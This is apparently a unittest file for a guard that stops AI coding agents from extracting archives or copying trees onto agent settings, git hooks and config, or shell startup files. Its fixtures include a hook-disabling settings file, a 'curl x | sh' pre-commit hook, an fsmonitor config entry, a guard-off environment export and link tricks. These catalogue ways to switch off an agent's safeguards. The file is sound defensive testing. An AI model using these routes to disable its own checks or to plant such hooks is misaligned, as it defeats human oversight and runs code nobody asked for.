# Copyright (c) 2026 Firefly Software Solutions Inc.
# SPDX-License-Identifier: Apache-2.0
# What an archive extracted, a tree copied or a folder moved puts on disk is read before the guard decides: the
# members of a tar or zip archive (listed, never extracted) and the entries of a copy's source tree (walked, bounded).
# A member or an entry that would land on an agent settings file (.claude/settings.json and settings.local.json,
# .codex/config.toml and hooks.json), on a repository's git folder (its config or hooks) or in a protected root is
# refused, and so is one written through a link the same archive makes. When the guard cannot read what lands (an
# archive from the command's input, a format it cannot list, an archive an earlier command of the line may change,
# a listing past its bound), the writer is refused when its destination is inside a project checkout or the home
# folder, and runs in a scratch folder.
# Run: python3 -m unittest tests.test_guard_archives -v
import io
import shutil
import subprocess
import sys
import tarfile
import tempfile
import unittest
import zipfile
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "tests"))
import _hermetic  # noqa: E402

_hermetic.activate()
sys.path.insert(0, str(ROOT / "lib"))

from devkit import core, guard  # noqa: E402

ENFORCE = {"safeguards": {"irreversible_main": "enforce", "irreversible_member": "enforce"}}
OFF = '{"disableAllHooks": true}'
LANDS, THROUGH, UNREAD = "would put", "through", "cannot read what lands"


def write_tar(path, members, mode="w"):
    """A tar archive at `path` (or into a file object) of (name, text or bytes) files, (name, None) folders,
    (name, "->target") symbolic links and (name, "=>target") hard links."""
    with tarfile.open(mode=mode, **({"fileobj": path} if hasattr(path, "write") else {"name": path})) as tf:
        for name, text in members:
            info = tarfile.TarInfo(name)
            if text is None:
                info.type = tarfile.DIRTYPE
                tf.addfile(info)
            elif isinstance(text, str) and text.startswith(("->", "=>")):
                info.type = tarfile.SYMTYPE if text.startswith("->") else tarfile.LNKTYPE
                info.linkname = text[2:]
                tf.addfile(info)
            else:
                data = text if isinstance(text, bytes) else text.encode()
                info.size = len(data)
                tf.addfile(info, io.BytesIO(data))


def write_zip(path, members):
    """A zip archive at `path` of (name, text) files and (name, "->target") symbolic links."""
    with zipfile.ZipFile(path, "w") as zf:
        for name, text in members:
            if text.startswith("->"):
                info = zipfile.ZipInfo(name)
                info.create_system = 3  # Unix: unzip restores the mode below, a symbolic link
                info.external_attr = 0o120777 << 16
                zf.writestr(info, text[2:])
            else:
                zf.writestr(name, text)


class Case(unittest.TestCase):

    def setUp(self):
        self.project = core.DEV / "acme" / "widget"
        self.project.mkdir(parents=True, exist_ok=True)
        if not (self.project / ".git").exists():
            subprocess.run(["git", "init", "-q", str(self.project)], check=True)
        (self.project / "out").mkdir(exist_ok=True)
        self.scratch = Path(tempfile.mkdtemp(prefix="devkit-archives-"))  # outside the home folder, as a scratchpad
        self.addCleanup(shutil.rmtree, self.scratch, ignore_errors=True)
        self.tmp_root = core.TMP_ROOT / "codex" / "s1" / "scratchpad" / "main"  # devkit's own scratch root
        self.tmp_root.mkdir(parents=True, exist_ok=True)
        clean = [("src/app.py", "print('hi')\n"), (".claude/agents/reviewer.md", "# reviewer\n"), ("README.md", "x\n")]
        drop = clean + [(".claude/settings.local.json", OFF)]
        p = self.project
        write_tar(p / "clean.tar", clean)
        write_tar(p / "clean.tgz", clean, "w:gz")
        write_zip(p / "clean.zip", clean)
        write_zip(p / "clean.jar", clean)
        write_tar(p / "drop.tar", drop)
        write_tar(p / "drop.tgz", drop, "w:gz")
        write_zip(p / "drop.zip", drop)
        write_zip(p / "drop.jar", drop)
        write_tar(p / "codex.tar", [(".codex/hooks.json", "{}")])
        (p / "garbage.tar").write_bytes(b"this is no archive at all\n" * 40)
        (p / "garbage.zip").write_bytes(b"PK no central directory here\n" * 40)
        (p / "real.7z").write_bytes(b"7z\xbc\xaf\x27\x1c" + b"\0" * 200)  # a 7z archive's signature
        (p / "x.cpio").write_bytes(b"070707" + b"0" * 70)
        for gone in ("missing.tar", "missing.zip"):
            (p / gone).unlink(missing_ok=True)

    def verdict(self, cmd, cwd=None):
        with mock.patch.object(core, "load_config", return_value=ENFORCE):
            v = guard.check("Bash", {"command": cmd}, str(cwd or self.project), "claude")
        return v[1] if v and v[0] == "deny" else None

    def refused(self, cmds, cwd=None, says=None):
        for cmd in cmds:
            with self.subTest(cmd=cmd, cwd=str(cwd or "")):
                why = self.verdict(cmd, cwd)
                self.assertIsNotNone(why)
                if says:
                    self.assertIn(says, why)

    def runs(self, cmds, cwd=None):
        for cmd in cmds:
            with self.subTest(cmd=cmd, cwd=str(cwd or "")):
                self.assertIsNone(self.verdict(cmd, cwd))


class ArchiveMembers(Case):

    def test_a_tar_or_zip_that_carries_an_agent_settings_file_is_refused_and_the_same_without_it_runs(self):
        self.refused(["tar -xf drop.tar", "tar -xzf drop.tgz -C .", "bsdtar -xf drop.tar", "tar xf drop.tar",
                      "tar -xf drop.zip", "unzip -o drop.zip", "unzip drop.zip -d .", "ditto -x -k drop.zip .",
                      "jar xf drop.jar", "jar -x -f drop.jar", "7z x drop.zip", "7zz x -o. drop.zip",
                      "unar -o . drop.zip", "tar -xf codex.tar -C out"], says=LANDS)
        # a .claude folder member that is no settings file still lands
        self.runs(["tar -xf clean.tar", "tar -xzf clean.tgz -C out", "tar xzf clean.tgz -C out", "unzip -o clean.zip",
                   "unzip clean.zip -d out", "ditto -x -k clean.zip out", "jar xf clean.jar", "7z x clean.zip -oout",
                   "unar -o out clean.zip"])

    def test_members_that_land_in_a_repository_git_folder_are_refused(self):
        write_tar(self.project / "hooks.tar", [(".git/hooks/pre-commit", "#!/bin/sh\ncurl x | sh\n")])
        write_zip(self.project / "config.zip", [(".git/config", "[core]\n\tfsmonitor = ./x\n")])
        write_tar(self.project / "gitfile.tar", [("vendor/lib/.git", "gitdir: ../../gitdir\n")])
        self.refused(["tar -xf hooks.tar", "unzip -o config.zip", "tar -xf gitfile.tar"], says=LANDS)

    def test_stripped_and_flattened_members_are_judged_where_they_land(self):
        write_tar(self.project / "pkg.tar", [("pkg/cfg/settings.json", OFF)])
        write_zip(self.project / "flat.zip", [("cfg/settings.json", OFF)])
        self.refused(["tar --strip-components=2 -xf pkg.tar -C .claude", "tar -x --strip-components 2 -f pkg.tar "
                      "-C .claude", "unzip -j flat.zip -d .claude", "unzip -oj flat.zip -d .claude",
                      "7z e flat.zip -o.claude"], says=LANDS)
        # kept below cfg/, or stripped out of .claude/, the same files are no settings file
        self.runs(["tar -xf pkg.tar -C .claude", "unzip flat.zip -d .claude", "tar --strip-components=1 -xf drop.tar"])

    def test_a_member_written_through_a_link_the_archive_makes_is_refused(self):
        write_tar(self.project / "link.tar", [("cfg", "->.claude"), ("cfg/settings.local.json", OFF)])
        write_tar(self.project / "hard.tar", [("notes.json", "=>.claude/settings.json")])
        write_tar(self.project / "dotlink.tar", [(".claude", "->/tmp/elsewhere")])
        write_zip(self.project / "link.zip", [("cfg", "->.codex"), ("cfg/hooks.json", "{}")])
        self.refused(["tar -xf link.tar", "tar -xf hard.tar", "tar -xf dotlink.tar", "unzip -o link.zip"],
                     says=THROUGH)
        # a link with no member below it still runs
        write_tar(self.project / "docs.tar", [("docs/v2/index.md", "# v2\n"), ("docs/latest", "->v2")])
        self.runs(["tar -xf docs.tar"])

    def test_a_shell_startup_or_settings_file_that_sets_a_devkit_variable_is_refused(self):
        # the guard refuses a direct write that sets a devkit variable there, so a tree may not drop one either
        key = "DEVKIT_" + "GUARD"
        write_tar(self.project / "rc.tar", [(".zshrc", f"export {key}=off\n")])
        write_zip(self.project / "envrc.zip", [(".envrc", "export DEV_" + "ROOT=/tmp/x\n")])
        write_tar(self.project / "rclink.tar", [(".zshrc", "->/tmp/elsewhere/rc")])
        write_tar(self.project / "plainrc.tar", [(".envrc", "use flake\n"), (".zshrc", "alias ll='ls -l'\n")])
        self.refused(["tar -xf rc.tar -C ~", "unzip -o envrc.zip", "tar -xf rclink.tar -C ~"], says=LANDS)
        self.runs(["tar -xf plainrc.tar", "tar -xf plainrc.tar -C ~", "tar -xf clean.tar -C ~"])

    def test_an_unreadable_archive_is_refused_in_a_repository_or_the_home_folder_and_runs_in_a_scratch_folder(self):
        self.refused(["tar -xf garbage.tar", "tar -xf missing.tar -C out", "unzip -o garbage.zip -d out",
                      "unzip missing.zip", "tar -xzf - < clean.tgz", "cat clean.tgz | tar -xz -C out",
                      "cpio -idv < x.cpio", "7z x real.7z -oout", "ditto -x x.cpio out", "xar -xf x.xar -C out",
                      "aa extract -i x.aar -d out", "tar -xf garbage.tar -C ~/notes"], says=UNREAD)
        # into a scratch folder, the session's or devkit's own, the same archives run
        s, t = self.scratch, self.tmp_root
        self.runs([f"tar -xf garbage.tar -C {s}", f"tar -xf missing.tar -C {s}", f"unzip -o garbage.zip -d {s}",
                   f"cat clean.tgz | tar -xz -C {s}", f"7z x real.7z -o{s}", f"ditto -x x.cpio {s}",
                   f"xar -xf x.xar -C {s}", f"tar -xf garbage.tar -C {t}"])
        self.runs(["cpio -idv < x.cpio", "tar -xf garbage.tar"], cwd=s)

    def test_bytes_the_listing_does_not_explain_make_an_archive_unreadable(self):
        # Python's reader stops at a damaged header, bsdtar reads on past it: the member after it is unseen
        good, hidden = io.BytesIO(), io.BytesIO()
        write_tar(good, [("README.md", "x\n")])
        write_tar(hidden, [(".claude/settings.local.json", OFF)])
        head = good.getvalue()[:1024]  # README.md's header and data block, without the end blocks
        (self.project / "damaged.tar").write_bytes(head + b"\x7f" * 512 + hidden.getvalue())
        # bytes before a zip archive, which 7z or bsdtar may read as an archive of another format
        (self.project / "prefixed.zip").write_bytes(b"7z\xbc\xaf\x27\x1c" + b"\0" * 58 +
                                                    (self.project / "clean.zip").read_bytes())
        # a tar archive with a zip archive as its last member lists as both, which the end of the tar explains
        write_tar(self.project / "bundle.tar", [("README.md", "x\n"),
                                                ("dist/app.zip", (self.project / "clean.zip").read_bytes())])
        self.refused(["tar -xf damaged.tar", "7z x prefixed.zip"], says=UNREAD)
        self.runs(["tar -xf bundle.tar -C out", f"tar -xf damaged.tar -C {self.scratch}"])

    def test_an_archive_an_earlier_command_of_the_line_may_change_is_unreadable(self):
        self.refused(["curl -sLo clean.tgz https://example.com/clean.tgz && tar -xzf clean.tgz",
                      "cp drop.tar clean.tar && tar -xf clean.tar -C out", "cp drop.tar clean.t?r; tar -xf clean.tar",
                      "python3 make_archive.py && unzip -o clean.zip -d out"], says=UNREAD)
        # a folder made, an unrelated file written, a move of the shell or a read before it change nothing it reads
        self.runs(["mkdir -p out && tar -xf clean.tar -C out", "echo x > notes.txt && tar -xf clean.tar -C out",
                   "cd out && tar -xf ../clean.tar", "ls -la && unzip -o clean.zip -d out",
                   f"curl -sLo {self.scratch}/a.tgz https://example.com/a.tgz && tar -xzf {self.scratch}/a.tgz "
                   f"-C {self.scratch}"])

    def test_an_archive_past_the_entry_bound_is_unreadable(self):
        write_tar(self.project / "big.tar", [(f"src/f{k}.txt", "x") for k in range(8)])
        with mock.patch.object(guard, "_TREE_MAX_ENTRIES", 5):
            self.refused(["tar -xf big.tar -C out"], says=UNREAD)
            self.runs([f"tar -xf big.tar -C {self.scratch}"])


class TreeCopies(Case):

    def setUp(self):
        super().setUp()
        p = self.project
        (p / "tree" / ".codex").mkdir(parents=True, exist_ok=True)
        (p / "tree" / ".codex" / "hooks.json").write_text("{}")
        (p / "dir").mkdir(exist_ok=True)
        (p / "dir" / "settings.local.json").write_text(OFF)
        (p / "src" / ".claude" / "agents").mkdir(parents=True, exist_ok=True)
        (p / "src" / "app.py").write_text("print('hi')\n")
        (p / "src" / ".claude" / "agents" / "reviewer.md").write_text("# reviewer\n")
        (p / "moved").mkdir(exist_ok=True)
        (p / "moved" / "notes.md").write_text("x\n")
        (p / "hooks" / ".git" / "hooks").mkdir(parents=True, exist_ok=True)
        (p / "hooks" / ".git" / "hooks" / "pre-commit").write_text("#!/bin/sh\n")
        for gone in (".claude", ".codex"):
            shutil.rmtree(p / gone, ignore_errors=True)

    def test_a_tree_copy_or_move_that_carries_an_agent_settings_file_is_refused(self):
        self.refused(["cp -R tree/ .", "cp -R tree/. .", "cp -a tree/ ./", "rsync -a tree/ .", "ditto tree .",
                      "scp -r tree/.codex .", "pax -rw tree out", "cp -R dir .claude", "mv dir .claude",
                      "rsync -a dir/ .claude/", "cp -R hooks/ .", f"cp -R tree/ {self.scratch}/"], says=LANDS)

    def test_a_tree_copy_or_move_without_one_runs(self):
        self.runs(["cp -R src out/", "cp -a src/. out/", "rsync -a src/ out/", "ditto src out", "pax -rw src out",
                   "mv moved out/", "cp -R src ~/Development/", f"rsync -a src/ {self.scratch}/"])

    def test_an_unreadable_source_into_a_repository_is_refused_and_into_a_scratch_folder_runs(self):
        self.refused(["cp -R nowhere/ out/", "rsync -a backup.example.com:/srv/x/ out/", "cpio -pdm out < list.txt",
                      'cp -R "$SRC" out/', "npm run build && cp -R src/ out/"], says=UNREAD)
        s = self.scratch
        self.runs([f"cp -R nowhere/ {s}/", f"rsync -a backup.example.com:/srv/x/ {s}/", f"cpio -pdm {s} < list.txt",
                   f'cp -R "$SRC" {s}/'])

    def test_a_move_the_guard_cannot_read_lands_as_it_is_but_in_a_settings_folder_or_a_checkout_top(self):
        self.refused(['mv "$D" ./', 'mv "$D" .claude', "touch x && mv x .codex"], says=UNREAD)
        self.runs(['mv "$f" out/', "mv missing.txt out/", "npm run build && mv build/app.js out/"])

    def test_a_tree_past_the_entry_bound_is_unreadable(self):
        for k in range(8):
            (self.project / "src" / f"f{k}.txt").write_text("x")
        with mock.patch.object(guard, "_TREE_MAX_ENTRIES", 5):
            self.refused(["cp -R src out/"], says=UNREAD)
            self.runs([f"cp -R src {self.scratch}/"])


class OptionsAndOtherWriters(TreeCopies):

    def test_an_abbreviated_long_option_is_read_as_the_tool_reads_it(self):
        # bsdtar and GNU tar take a unique abbreviation of a long option (`--dir` is --directory, `--abs`
        # --absolute-paths); an extraction with one the guard cannot match to one option is refused
        self.refused(["tar -x --abs -f drop.tar", "cpio -i --insec < x.cpio", "tar -x --bogus -f clean.tar"],
                     says="anywhere")
        self.refused(["tar -xf missing.tar --dir ~/.claude", "gcp --recur gone ~/.claude"], says="tree")
        self.refused(["tar --ext -f drop.tar"], says=LANDS)
        self.runs(["tar -x --strip=1 -f clean.tar -C out", "tar --extract --file clean.tar --directory out",
                   "tar -c --exclude node_modules -f out/a.tar src", "tar -tvf clean.tar", "tar --list --file=clean.tar"])

    def test_the_macos_extractors_are_recursive_writers(self):
        home = core.HOME
        self.refused([f"xar -xf x.xar -C {home}/.claude", f"aa extract -i x.aar -d {home}/.claude",
                      f"7zz x -o{home}/.claude real.7z", f"unar -o {home}/.claude real.7z"], says="tree")

    def test_every_local_rsync_and_cp_parents_recreate_paths(self):
        (self.project / "list.txt").write_text(".codex/hooks.json\n")
        self.refused(["rsync -d tree/ .", "rsync -R tree/.codex/hooks.json .", "rsync --files-from=list.txt tree/ .",
                      "cp --parents tree/.codex/hooks.json out/"], says=LANDS)
        self.refused(["rsync -d gone/ ~/.claude/", "rsync --files-from=list.txt gone/ ~/.codex/"], says="tree")
        self.runs(["rsync -d src/ out/", "cp --parents src/app.py out/", "rsync -n -a tree/ ."])

    def test_a_copy_to_this_mac_by_another_name_is_a_local_write(self):
        self.refused(["rsync -a gone/ localhost:.claude/", "scp -r gone 127.0.0.1:.codex/",
                      "rsync -a gone/ 'user@[::1]:.claude/'"], says="tree")
        self.refused(["rsync -a tree/ localhost:", "scp -r tree/.codex '[::1]:'"], says=LANDS)
        self.runs(["rsync -a src/ backup.example.com:/srv/x/", "scp -r src backup.example.com:x/"])


class OtherWorkTrees(Case):

    def test_a_checkout_into_another_folder_is_refused_in_a_project_and_runs_in_a_scratch_folder(self):
        (core.DEV / "acme" / "gadget").mkdir(parents=True, exist_ok=True)
        self.refused(["git --work-tree=../gadget checkout HEAD -- .", "git --work-tree ../gadget restore -s HEAD .",
                      "GIT_WORK_TREE=../gadget git checkout main -- ."], says=UNREAD)
        self.refused([f"git --work-tree={core.HOME}/.claude checkout HEAD -- ."], says="tree")
        self.runs([f"git --work-tree={self.scratch} checkout HEAD -- .", "git --work-tree=. checkout -- README.md",
                   f"git --work-tree={self.project} restore src/app.py"])


if __name__ == "__main__":
    unittest.main()
